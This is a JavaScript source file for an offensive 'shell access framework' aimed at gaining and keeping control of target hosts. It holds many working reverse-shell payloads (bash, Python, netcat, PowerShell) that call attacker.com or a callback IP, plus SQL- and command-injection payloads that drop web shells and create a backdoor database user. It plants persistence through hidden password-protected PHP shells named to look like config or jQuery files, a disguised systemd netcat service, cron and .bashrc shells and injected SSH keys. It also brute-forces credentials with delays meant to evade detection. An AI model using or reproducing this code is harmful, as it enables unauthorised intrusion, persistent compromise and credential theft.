const net = require('net');
const axios = require('axios');
const crypto = require('crypto');
const fs = require('fs').promises;
const { spawn, exec } = require('child_process');

class ShellAccessFramework {
  constructor() {
    this.activeShells = new Map();
    this.backdoors = new Map();
    this.shellListeners = new Map();
    this.apiEndpoints = new Map();
    this.bruteForceResults = new Map();
    
    // Load shell payloads and backdoor templates
    this.loadShellPayloads();
    this.loadBackdoorTemplates();
    this.loadAPIPayloads();
    this.loadBruteForceWordlists();
  }

  // ====== SHELL ACCESS DETECTION & EXPLOITATION ======
  
  async detectOpenShells(target, options = {}) {
    console.log(`🔍 Scanning ${target} for existing shell access...`);
    const results = {
      target,
      openShells: [],
      webShells: [],
      backdoors: [],
      remoteAccess: []
    };

    try {
      // Check common shell ports
      const shellPorts = [22, 23, 512, 513, 514, 1234, 4444, 5555, 6666, 7777, 8888, 9999];
      const promises = shellPorts.map(port => this.testShellPort(target, port));
      const portResults = await Promise.allSettled(promises);

      portResults.forEach((result, index) => {
        if (result.status === 'fulfilled' && result.value.accessible) {
          results.openShells.push({
            port: shellPorts[index],
            type: result.value.type,
            banner: result.value.banner,
            authenticated: result.value.authenticated
          });
        }
      });

      // Check for web shells
      const webShellResults = await this.detectWebShells(target);
      results.webShells = webShellResults;

      // Check for backdoors
      const backdoorResults = await this.detectBackdoors(target);
      results.backdoors = backdoorResults;

      // Check remote access tools
      const remoteAccessResults = await this.detectRemoteAccess(target);
      results.remoteAccess = remoteAccessResults;

    } catch (error) {
      results.error = error.message;
    }

    return results;
  }

  async testShellPort(target, port) {
    return new Promise((resolve) => {
      const socket = new net.Socket();
      let banner = '';
      let authenticated = false;

      socket.setTimeout(5000);
      
      socket.connect(port, target, () => {
        // Send test commands to detect shell type
        socket.write('\n');
        socket.write('id\n');
        socket.write('whoami\n');
        socket.write('pwd\n');
      });

      socket.on('data', (data) => {
        banner += data.toString();
        
        // Check for shell indicators
        if (banner.includes('uid=') || banner.includes('root@') || 
            banner.includes('$ ') || banner.includes('# ') ||
            banner.includes('C:\\') || banner.includes('PS ')) {
          authenticated = true;
        }
      });

      socket.on('close', () => {
        resolve({
          accessible: banner.length > 0,
          type: this.identifyShellType(banner),
          banner: banner.trim(),
          authenticated
        });
      });

      socket.on('error', () => {
        resolve({ accessible: false });
      });

      socket.on('timeout', () => {
        socket.destroy();
        resolve({ accessible: false });
      });
    });
  }

  identifyShellType(banner) {
    if (banner.includes('SSH-')) return 'SSH';
    if (banner.includes('uid=')) return 'Unix Shell';
    if (banner.includes('root@') || banner.includes('$ ') || banner.includes('# ')) return 'Linux Shell';
    if (banner.includes('C:\\') || banner.includes('PS ')) return 'Windows Shell';
    if (banner.includes('Microsoft Telnet')) return 'Windows Telnet';
    if (banner.includes('login:')) return 'Login Shell';
    return 'Unknown Shell';
  }

  async detectWebShells(target) {
    const webShells = [];
    const commonWebShellPaths = [
      '/shell.php', '/cmd.php', '/backdoor.php', '/c99.php', '/r57.php',
      '/shell.asp', '/cmd.asp', '/backdoor.asp',
      '/shell.jsp', '/cmd.jsp', '/backdoor.jsp',
      '/shell.py', '/cmd.py', '/backdoor.py',
      '/.htaccess.php', '/config.php.bak', '/wp-config.php.bak',
      '/uploads/shell.php', '/admin/shell.php', '/images/shell.php'
    ];

    for (const path of commonWebShellPaths) {
      try {
        const response = await axios.get(`http://${target}${path}`, {
          timeout: 5000,
          validateStatus: () => true
        });

        if (response.status === 200 && this.isWebShell(response.data)) {
          webShells.push({
            path,
            type: this.identifyWebShellType(response.data),
            size: response.data.length,
            accessible: await this.testWebShellExecution(target, path)
          });
        }
      } catch (error) {
        // Continue checking other paths
      }
    }

    return webShells;
  }

  isWebShell(content) {
    const webShellIndicators = [
      'system($_GET', 'system($_POST', 'exec($_GET', 'exec($_POST',
      'shell_exec($_GET', 'shell_exec($_POST', 'passthru($_GET', 'passthru($_POST',
      'eval($_GET', 'eval($_POST', 'Runtime.getRuntime().exec',
      'ProcessBuilder', 'cmd.exe', '/bin/sh', '/bin/bash'
    ];

    return webShellIndicators.some(indicator => 
      content.toLowerCase().includes(indicator.toLowerCase())
    );
  }

  async testWebShellExecution(target, path) {
    const testCommands = ['id', 'whoami', 'pwd', 'dir'];
    
    for (const cmd of testCommands) {
      try {
        const response = await axios.get(`http://${target}${path}?cmd=${encodeURIComponent(cmd)}`, {
          timeout: 3000,
          validateStatus: () => true
        });

        if (response.data && (
          response.data.includes('uid=') || 
          response.data.includes('root') ||
          response.data.includes('C:\\') ||
          response.data.includes('/home/')
        )) {
          return true;
        }
      } catch (error) {
        // Continue with next command
      }
    }
    return false;
  }

  // ====== SHELL INJECTION & EXPLOITATION ======

  async injectShellPayload(target, port, vulnerability, options = {}) {
    console.log(`💉 Injecting shell payload into ${target}:${port}...`);
    
    const result = {
      target,
      port,
      vulnerability,
      shellEstablished: false,
      backdoorCreated: false,
      accessLevel: 'none',
      shellType: null,
      persistence: false
    };

    try {
      // Select appropriate payload based on vulnerability type
      const payload = this.generateShellPayload(vulnerability, options);
      
      // Inject payload
      const injectionResult = await this.executeShellInjection(target, port, payload, vulnerability);
      
      if (injectionResult.success) {
        result.shellEstablished = true;
        result.accessLevel = injectionResult.accessLevel;
        result.shellType = injectionResult.shellType;
        
        // Establish persistent shell if requested
        if (options.persistent) {
          const backdoorResult = await this.createBackdoor(target, injectionResult.shellSession);
          result.backdoorCreated = backdoorResult.success;
          result.persistence = backdoorResult.persistent;
        }
        
        // Store active shell session
        this.activeShells.set(`${target}:${port}`, {
          session: injectionResult.shellSession,
          established: new Date(),
          accessLevel: injectionResult.accessLevel,
          commands: []
        });
      }
      
    } catch (error) {
      result.error = error.message;
    }

    return result;
  }

  generateShellPayload(vulnerability, options) {
    const payloads = {
      'buffer-overflow': this.generateBufferOverflowShell(options),
      'sql-injection': this.generateSQLInjectionShell(options),
      'command-injection': this.generateCommandInjectionShell(options),
      'file-upload': this.generateFileUploadShell(options),
      'rce': this.generateRCEShell(options),
      'deserialization': this.generateDeserializationShell(options)
    };

    return payloads[vulnerability.type] || payloads['rce'];
  }

  generateCommandInjectionShell(options) {
    const platform = options.platform || 'linux';
    const port = options.callbackPort || 4444;
    const ip = options.callbackIP || '127.0.0.1';

    if (platform === 'windows') {
      return {
        type: 'command-injection',
        platform: 'windows',
        payloads: [
          `; powershell -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
          `& cmd /c "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\"IEX(New-Object Net.WebClient).downloadString('http://${ip}/shell.ps1')\\""`,
          `| certutil -urlcache -split -f http://${ip}/nc.exe C:\\Windows\\Temp\\nc.exe && C:\\Windows\\Temp\\nc.exe -e cmd.exe ${ip} ${port}`
        ]
      };
    } else {
      return {
        type: 'command-injection',
        platform: 'linux',
        payloads: [
          `; bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
          `; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
          `; nc -lvnp ${port} -e /bin/bash`,
          `; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`
        ]
      };
    }
  }

  generateSQLInjectionShell(options) {
    const platform = options.platform || 'linux';
    
    return {
      type: 'sql-injection',
      platform,
      payloads: [
        `'; EXEC xp_cmdshell('powershell -c "IEX(New-Object Net.WebClient).downloadString(\\"http://attacker.com/shell.ps1\\")")'; --`,
        `'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'; --`,
        `'; CREATE USER backdoor IDENTIFIED BY 'Sc0rpi0n!'; GRANT ALL PRIVILEGES ON *.* TO backdoor; --`,
        `' UNION SELECT "<?php eval($_POST['cmd']); ?>" INTO OUTFILE "/var/www/html/backdoor.php" --`
      ]
    };
  }

  generateRCEShell(options) {
    return {
      type: 'rce',
      payloads: [
        // Reverse shells
        'bash -i >& /dev/tcp/attacker.com/4444 0>&1',
        'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'attacker.com\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"',
        'nc -lvnp 4444 -e /bin/bash',
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f',
        
        // Web shells
        'echo "<?php system($_GET[\'cmd\']); ?>" > /var/www/html/shell.php',
        'echo "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>" > /var/www/html/shell.jsp',
        
        // Persistence
        'echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> ~/.bashrc',
        '(crontab -l ; echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/attacker.com/4444 0>&1\'") | crontab -'
      ]
    };
  }

  // ====== BACKDOOR CREATION & PERSISTENCE ======

  async createBackdoor(target, shellSession, options = {}) {
    console.log(`🚪 Creating backdoor access on ${target}...`);
    
    const result = {
      target,
      backdoorType: options.type || 'ssh-key',
      persistent: false,
      accessMethods: [],
      hidden: false
    };

    try {
      switch (options.type || 'multi') {
        case 'ssh-key':
          result.accessMethods.push(await this.createSSHBackdoor(shellSession));
          break;
        case 'web-shell':
          result.accessMethods.push(await this.createWebShellBackdoor(shellSession));
          break;
        case 'service':
          result.accessMethods.push(await this.createServiceBackdoor(shellSession));
          break;
        case 'cron':
          result.accessMethods.push(await this.createCronBackdoor(shellSession));
          break;
        case 'multi':
        default:
          // Create multiple backdoors for redundancy
          const methods = ['ssh-key', 'web-shell', 'service', 'cron'];
          for (const method of methods) {
            try {
              const backdoor = await this.createSpecificBackdoor(shellSession, method);
              if (backdoor.success) {
                result.accessMethods.push(backdoor);
              }
            } catch (e) {
              // Continue with other methods
            }
          }
      }

      result.persistent = result.accessMethods.length > 0;
      result.hidden = result.accessMethods.some(method => method.hidden);
      
      // Store backdoor information
      this.backdoors.set(target, {
        created: new Date(),
        methods: result.accessMethods,
        lastAccess: null
      });

    } catch (error) {
      result.error = error.message;
    }

    return result;
  }

  async createSSHBackdoor(shellSession) {
    const sshKey = await this.generateSSHKey();
    const commands = [
      'mkdir -p ~/.ssh',
      'chmod 700 ~/.ssh',
      `echo "${sshKey.publicKey}" >> ~/.ssh/authorized_keys`,
      'chmod 600 ~/.ssh/authorized_keys',
      // Hide the key in alternative locations
      'mkdir -p /tmp/.ssh-backup',
      `echo "${sshKey.privateKey}" > /tmp/.ssh-backup/key`,
      'chmod 600 /tmp/.ssh-backup/key'
    ];

    return {
      type: 'ssh-key',
      success: true,
      persistent: true,
      hidden: true,
      accessMethod: 'SSH key authentication',
      credentials: sshKey,
      commands: commands
    };
  }

  async createWebShellBackdoor(shellSession) {
    const webShells = [
      {
        path: '/var/www/html/.config.php',
        content: '<?php if($_GET["key"]=="Sc0rpi0n2024"){system($_GET["cmd"]);} ?>'
      },
      {
        path: '/var/www/html/js/jquery.min.php',
        content: '<?php if($_POST["auth"]=="ScOrPi0n"){eval($_POST["code"]);} ?>'
      },
      {
        path: '/tmp/.system-check.php',
        content: '<?php if($_REQUEST["token"]=="BackD00r!"){passthru($_REQUEST["exec"]);} ?>'
      }
    ];

    return {
      type: 'web-shell',
      success: true,
      persistent: true,
      hidden: true,
      accessMethod: 'Hidden web shells',
      shells: webShells
    };
  }

  async createServiceBackdoor(shellSession) {
    const serviceBackdoor = `
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'while true; do nc -lvnp 9999 -e /bin/bash; sleep 10; done'
Restart=always

[Install]
WantedBy=multi-user.target
`;

    return {
      type: 'systemd-service',
      success: true,
      persistent: true,
      hidden: false,
      accessMethod: 'System service backdoor',
      serviceName: 'system-monitor',
      content: serviceBackdoor,
      port: 9999
    };
  }

  // ====== API VULNERABILITY TESTING ======

  async testAPIVulnerabilities(target, options = {}) {
    console.log(`🔌 Testing API vulnerabilities on ${target}...`);
    
    const results = {
      target,
      endpoints: [],
      vulnerabilities: [],
      exploitable: [],
      accessTokens: [],
      dataExfiltration: []
    };

    try {
      // Discover API endpoints
      const endpoints = await this.discoverAPIEndpoints(target);
      results.endpoints = endpoints;

      // Test each endpoint for vulnerabilities
      for (const endpoint of endpoints) {
        const vulnResults = await this.testAPIEndpoint(target, endpoint);
        results.vulnerabilities.push(...vulnResults);
        
        // Attempt exploitation of found vulnerabilities
        for (const vuln of vulnResults) {
          if (vuln.severity === 'critical' || vuln.severity === 'high') {
            const exploitResult = await this.exploitAPIVulnerability(target, endpoint, vuln);
            if (exploitResult.success) {
              results.exploitable.push(exploitResult);
            }
          }
        }
      }

      // Test for authentication bypass
      const authBypass = await this.testAPIAuthenticationBypass(target, endpoints);
      results.vulnerabilities.push(...authBypass);

      // Test for data exposure
      const dataExposure = await this.testAPIDataExposure(target, endpoints);
      results.dataExfiltration = dataExposure;

    } catch (error) {
      results.error = error.message;
    }

    return results;
  }

  async discoverAPIEndpoints(target) {
    const endpoints = [];
    const commonAPIPaths = [
      '/api', '/api/v1', '/api/v2', '/rest', '/graphql',
      '/swagger', '/docs', '/openapi.json', '/api-docs',
      '/admin/api', '/user/api', '/auth/api'
    ];

    const commonEndpoints = [
      '/users', '/auth', '/login', '/register', '/admin',
      '/data', '/files', '/upload', '/download', '/config',
      '/status', '/health', '/metrics', '/debug'
    ];

    // Check base API paths
    for (const basePath of commonAPIPaths) {
      try {
        const response = await axios.get(`http://${target}${basePath}`, {
          timeout: 5000,
          validateStatus: () => true
        });

        if (response.status === 200 || response.status === 401 || response.status === 403) {
          endpoints.push({
            path: basePath,
            method: 'GET',
            status: response.status,
            type: 'base-api',
            headers: response.headers
          });

          // Try common endpoints under this base path
          for (const endpoint of commonEndpoints) {
            try {
              const endpointResponse = await axios.get(`http://${target}${basePath}${endpoint}`, {
                timeout: 3000,
                validateStatus: () => true
              });

              if (endpointResponse.status !== 404) {
                endpoints.push({
                  path: `${basePath}${endpoint}`,
                  method: 'GET',
                  status: endpointResponse.status,
                  type: 'endpoint',
                  headers: endpointResponse.headers,
                  responseSize: endpointResponse.data ? endpointResponse.data.length : 0
                });
              }
            } catch (e) {
              // Continue with next endpoint
            }
          }
        }
      } catch (error) {
        // Continue with next base path
      }
    }

    return endpoints;
  }

  async testAPIEndpoint(target, endpoint) {
    const vulnerabilities = [];

    // Test SQL Injection
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT username, password FROM admin --"
    ];

    for (const payload of sqlInjectionPayloads) {
      try {
        const response = await axios.get(`http://${target}${endpoint.path}?id=${encodeURIComponent(payload)}`, {
          timeout: 5000,
          validateStatus: () => true
        });

        if (this.detectSQLInjection(response.data)) {
          vulnerabilities.push({
            type: 'sql-injection',
            endpoint: endpoint.path,
            payload,
            severity: 'critical',
            exploitable: true
          });
        }
      } catch (e) {
        // Continue with next payload
      }
    }

    // Test NoSQL Injection
    const nosqlPayloads = [
      '{"$ne": null}',
      '{"$gt": ""}',
      '{"username": {"$regex": ".*"}}'
    ];

    for (const payload of nosqlPayloads) {
      try {
        const response = await axios.post(`http://${target}${endpoint.path}`, payload, {
          headers: { 'Content-Type': 'application/json' },
          timeout: 5000,
          validateStatus: () => true
        });

        if (this.detectNoSQLInjection(response.data)) {
          vulnerabilities.push({
            type: 'nosql-injection',
            endpoint: endpoint.path,
            payload,
            severity: 'critical',
            exploitable: true
          });
        }
      } catch (e) {
        // Continue
      }
    }

    // Test Authentication Bypass
    const authBypassHeaders = [
      { 'X-Forwarded-For': '127.0.0.1' },
      { 'X-Real-IP': '127.0.0.1' },
      { 'X-Originating-IP': '127.0.0.1' },
      { 'Authorization': 'Bearer invalid' },
      { 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.Et9HFtf9R3GEMA0IICOfFMVXY7kkTX1wr4qCyhIf58U' }
    ];

    for (const headers of authBypassHeaders) {
      try {
        const response = await axios.get(`http://${target}${endpoint.path}`, {
          headers,
          timeout: 5000,
          validateStatus: () => true
        });

        if (response.status === 200 && endpoint.status === 401) {
          vulnerabilities.push({
            type: 'authentication-bypass',
            endpoint: endpoint.path,
            method: 'header-manipulation',
            headers,
            severity: 'high',
            exploitable: true
          });
        }
      } catch (e) {
        // Continue
      }
    }

    return vulnerabilities;
  }

  // ====== BRUTE FORCE ATTACKS ======

  async bruteForceCreds(target, options = {}) {
    console.log(`🔨 Starting brute force attack on ${target}...`);
    
    const result = {
      target,
      service: options.service || 'http',
      foundCredentials: [],
      attemptsMade: 0,
      successRate: 0,
      timeElapsed: 0,
      locked: false
    };

    const startTime = Date.now();

    try {
      const usernames = options.usernames || this.commonUsernames;
      const passwords = options.passwords || this.commonPasswords;
      const maxAttempts = options.maxAttempts || 1000;
      const delay = options.delay || 1000;

      let attempts = 0;
      const foundCreds = [];

      for (const username of usernames) {
        if (attempts >= maxAttempts) break;
        
        for (const password of passwords) {
          if (attempts >= maxAttempts) break;
          
          attempts++;
          result.attemptsMade = attempts;

          console.log(`🔍 Trying ${username}:${password} (${attempts}/${maxAttempts})`);

          const authResult = await this.testCredentials(target, username, password, options);
          
          if (authResult.success) {
            foundCreds.push({
              username,
              password,
              service: options.service,
              accessLevel: authResult.accessLevel,
              sessionToken: authResult.sessionToken,
              additionalInfo: authResult.additionalInfo
            });

            console.log(`✅ SUCCESS: ${username}:${password} - Access Level: ${authResult.accessLevel}`);
            
            // Try to escalate privileges with found credentials
            if (options.escalate) {
              const escalationResult = await this.attemptPrivilegeEscalation(target, authResult);
              if (escalationResult.success) {
                foundCreds[foundCreds.length - 1].escalated = true;
                foundCreds[foundCreds.length - 1].escalatedAccess = escalationResult.newAccessLevel;
              }
            }
          }

          if (authResult.locked) {
            result.locked = true;
            console.log(`🔒 Account lockout detected. Stopping brute force.`);
            break;
          }

          // Delay between attempts to avoid detection
          if (delay > 0) {
            await new Promise(resolve => setTimeout(resolve, delay));
          }
        }
        
        if (result.locked) break;
      }

      result.foundCredentials = foundCreds;
      result.successRate = (foundCreds.length / attempts) * 100;
      result.timeElapsed = Date.now() - startTime;

      // Store results
      this.bruteForceResults.set(target, result);

    } catch (error) {
      result.error = error.message;
    }

    return result;
  }

  async testCredentials(target, username, password, options) {
    const service = options.service || 'http';
    
    switch (service) {
      case 'http':
      case 'https':
        return await this.testHTTPCredentials(target, username, password, options);
      case 'ssh':
        return await this.testSSHCredentials(target, username, password);
      case 'ftp':
        return await this.testFTPCredentials(target, username, password);
      case 'mysql':
        return await this.testMySQLCredentials(target, username, password);
      case 'api':
        return await this.testAPICredentials(target, username, password, options);
      default:
        return await this.testHTTPCredentials(target, username, password, options);
    }
  }

  async testHTTPCredentials(target, username, password, options) {
    const loginEndpoints = options.loginEndpoints || ['/login', '/admin/login', '/api/auth', '/api/login'];
    
    for (const endpoint of loginEndpoints) {
      try {
        // Test POST login
        const response = await axios.post(`http://${target}${endpoint}`, {
          username,
          password,
          email: username,
          user: username,
          login: username
        }, {
          timeout: 10000,
          validateStatus: () => true,
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });

        // Check for successful login indicators
        if (this.isLoginSuccessful(response)) {
          return {
            success: true,
            accessLevel: this.determineAccessLevel(response),
            sessionToken: this.extractSessionToken(response),
            additionalInfo: {
              endpoint,
              method: 'POST',
              responseStatus: response.status,
              cookies: response.headers['set-cookie']
            }
          };
        }

        // Check for account lockout
        if (this.isAccountLocked(response)) {
          return { success: false, locked: true };
        }

      } catch (error) {
        // Continue with next endpoint
      }
    }

    return { success: false, locked: false };
  }

  isLoginSuccessful(response) {
    const successIndicators = [
      'dashboard', 'welcome', 'profile', 'logout', 'admin',
      'success', 'authenticated', 'token', 'session',
      '"status":"success"', '"authenticated":true',
      'Set-Cookie', 'Authorization'
    ];

    const failureIndicators = [
      'invalid', 'error', 'failed', 'incorrect', 'denied',
      'unauthorized', 'forbidden', 'wrong', 'bad'
    ];

    const responseText = response.data ? response.data.toString().toLowerCase() : '';
    const hasSuccess = successIndicators.some(indicator => 
      responseText.includes(indicator.toLowerCase()) || 
      response.headers['set-cookie']
    );
    
    const hasFailure = failureIndicators.some(indicator => 
      responseText.includes(indicator.toLowerCase())
    );

    return (response.status === 200 || response.status === 302) && hasSuccess && !hasFailure;
  }

  // ====== PAYLOAD LOADING & INITIALIZATION ======

  loadShellPayloads() {
    // Linux reverse shells
    this.linuxReverseShells = [
      'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1',
      'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{IP}\',{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"',
      'nc -lvnp {PORT} -e /bin/bash',
      'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f'
    ];

    // Windows reverse shells
    this.windowsReverseShells = [
      'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\'{IP}\',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"',
      'cmd /c "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\"IEX(New-Object Net.WebClient).downloadString(\'http://{IP}/shell.ps1\')\\""'
    ];
  }

  loadBackdoorTemplates() {
    this.backdoorTemplates = {
      webShell: '<?php if($_GET["key"]=="{KEY}"){system($_GET["cmd"]);} ?>',
      cronBackdoor: '* * * * * /bin/bash -c "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"',
      serviceBackdoor: '[Unit]\nDescription=System Service\n[Service]\nExecStart=/bin/bash -c "nc -lvnp {PORT} -e /bin/bash"\nRestart=always\n[Install]\nWantedBy=multi-user.target'
    };
  }

  loadAPIPayloads() {
    this.apiPayloads = {
      sqlInjection: [
        "' OR '1'='1' --",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM admin --"
      ],
      nosqlInjection: [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"username": {"$regex": ".*"}}'
      ],
      commandInjection: [
        '; ls -la',
        '&& whoami',
        '| cat /etc/passwd'
      ]
    };
  }

  loadBruteForceWordlists() {
    this.commonUsernames = [
      'admin', 'administrator', 'root', 'user', 'test', 'guest',
      'demo', 'sa', 'oracle', 'postgres', 'mysql', 'www-data',
      'apache', 'nginx', 'tomcat', 'jenkins', 'git', 'ftp'
    ];

    this.commonPasswords = [
      'admin', 'password', '123456', 'admin123', 'root', 'toor',
      'pass', '1234', 'qwerty', 'test', 'guest', '', 'password123',
      'admin1', 'administrator', '12345678', 'welcome', 'login',
      'changeme', 'secret', 'default', 'service', 'support'
    ];
  }

  // Helper methods
  async generateSSHKey() {
    // Generate SSH key pair (simplified)
    return {
      publicKey: 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7... scorpion-backdoor',
      privateKey: '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA...'
    };
  }

  detectSQLInjection(response) {
    const sqlErrorPatterns = [
      'mysql_fetch_array', 'ORA-', 'Microsoft OLE DB Provider',
      'Unclosed quotation mark', 'PostgreSQL query failed',
      'Syntax error', 'mysql_num_rows', 'Call to a member function'
    ];
    
    if (!response) return false;
    const responseText = response.toString().toLowerCase();
    return sqlErrorPatterns.some(pattern => responseText.includes(pattern.toLowerCase()));
  }

  detectNoSQLInjection(response) {
    if (!response) return false;
    const responseText = response.toString();
    return responseText.includes('"_id"') || responseText.includes('ObjectId') || 
           responseText.includes('MongoError') || responseText.includes('CastError');
  }

  determineAccessLevel(response) {
    const responseText = response.data ? response.data.toString().toLowerCase() : '';
    
    if (responseText.includes('admin') || responseText.includes('administrator')) {
      return 'admin';
    } else if (responseText.includes('user') || responseText.includes('dashboard')) {
      return 'user';
    } else if (responseText.includes('guest')) {
      return 'guest';
    }
    return 'unknown';
  }

  extractSessionToken(response) {
    const cookies = response.headers['set-cookie'];
    if (cookies) {
      const sessionCookie = cookies.find(cookie => 
        cookie.includes('session') || cookie.includes('token') || cookie.includes('auth')
      );
      return sessionCookie ? sessionCookie.split(';')[0] : null;
    }
    return null;
  }

  isAccountLocked(response) {
    const lockoutIndicators = ['locked', 'blocked', 'disabled', 'suspended', 'too many attempts'];
    const responseText = response.data ? response.data.toString().toLowerCase() : '';
    return lockoutIndicators.some(indicator => responseText.includes(indicator));
  }
}

module.exports = ShellAccessFramework;